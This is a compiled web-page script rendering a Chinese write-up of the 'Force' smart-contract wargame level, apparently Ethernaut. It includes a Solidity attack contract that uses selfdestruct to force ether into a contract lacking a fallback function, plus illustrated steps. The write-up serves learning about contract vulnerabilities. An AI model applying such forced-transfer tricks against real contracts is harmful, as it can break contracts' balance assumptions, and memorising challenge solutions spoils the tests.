(window.webpackJsonp=window.webpackJsonp||[]).push([[32],{2875:function(s,a,t){"use strict";t.r(a);var n=t(64),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"_7-force"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_7-force"}},[s._v("#")]),s._v(" 7.Force")]),s._v(" "),a("h2",{attrs:{id:"题目描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#题目描述"}},[s._v("#")]),s._v(" 题目描述")]),s._v(" "),a("p",[a("img",{attrs:{src:t(892),alt:"img"}})]),s._v(" "),a("h2",{attrs:{id:"解题过程"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解题过程"}},[s._v("#")]),s._v(" 解题过程")]),s._v(" "),a("p",[s._v("题目源码")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// SPDX-License-Identifier: MIT")]),s._v("\npragma solidity "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("^")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.6")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\ncontract Force "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n\n*/")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br")])]),a("p",[s._v("题目要求为该合约余额大于0，而源码中不存在 fallback函数，导致合约不能通过常规交易接收以太币。")]),s._v(" "),a("p",[a("img",{attrs:{src:t(893),alt:"img"}})]),s._v(" "),a("p",[s._v("我们在官方文档中可以看到一个函数介绍，可以在没有 fallback的情况下强制对合约进行转账")]),s._v(" "),a("p",[a("img",{attrs:{src:t(894),alt:"img"}})]),s._v(" "),a("p",[s._v("那我们的思路就是部署一个自毁合约，对这个合约转账后进行自毁对目标合约强制转入以太币")]),s._v(" "),a("p",[a("img",{attrs:{src:t(895),alt:"img"}})]),s._v(" "),a("p",[s._v("部署攻击合约")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// SPDX-License-Identifier: MIT")]),s._v("\npragma solidity "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("^")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.6")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\ncontract Force "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n\n*/")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\ncontract Attack"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    \n    address "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" addr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    \n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("setAddr")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[s._v("address x")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        addr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" x"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    \n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("kill")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        address payable desaddr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("payable")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("address")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("addr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("selfdestruct")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("desaddr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("receive")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" external payable "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br")])]),a("p",[s._v("向攻击合约地址转入 0.001 ETH")]),s._v(" "),a("p",[a("img",{attrs:{src:t(896),alt:"img"}})]),s._v(" "),a("p",[a("img",{attrs:{src:t(897),alt:"img"}})]),s._v(" "),a("p",[s._v("向目标合约调用自毁函数")]),s._v(" "),a("p",[a("img",{attrs:{src:t(898),alt:"img"}})]),s._v(" "),a("p",[s._v("查看交易hash是否成功")]),s._v(" "),a("p",[a("img",{attrs:{src:t(899),alt:"img"}})]),s._v(" "),a("p",[a("img",{attrs:{src:t(900),alt:"img"}})]),s._v(" "),a("p",[s._v("目标合约成功被强制转入ETH")])])}),[],!1,null,null,null);a.default=e.exports},892:function(s,a,t){s.exports=t.p+"assets/img/1645310166968-61bf7c00-6a02-4a84-b26a-f895aa72be1e.7d858702.png"},893:function(s,a,t){s.exports=t.p+"assets/img/1645310742977-9e519e94-8580-4bce-b8fd-f08ab9203723.1c3b6598.png"},894:function(s,a,t){s.exports=t.p+"assets/img/1645310796703-eff3f936-8b01-4abc-bac0-d636118592aa.f5a010c0.png"},895:function(s,a,t){s.exports=t.p+"assets/img/1645311086893-c7687fa0-ea7f-428e-98b2-f3fc236265fd.1c672c97.png"},896:function(s,a,t){s.exports=t.p+"assets/img/1645312161704-d95d2483-00d4-4c05-bfaf-dce922feb7a8.ccafd1ca.png"},897:function(s,a,t){s.exports=t.p+"assets/img/1645312130166-8bf4b2ae-3e55-44f4-90e1-8d7d6f152e0c.78a84878.png"},898:function(s,a,t){s.exports=t.p+"assets/img/1645312357912-61ba040b-d64c-473c-85cd-7a55d0b6881e.3a66326a.png"},899:function(s,a,t){s.exports=t.p+"assets/img/1645312376428-a376d0b7-f266-4525-ad66-937df46c3b46.8f2589ec.png"},900:function(s,a,t){s.exports=t.p+"assets/img/1645312386621-eb7a524d-962c-42bc-812f-40006baca411.4077ab9d.png"}}]);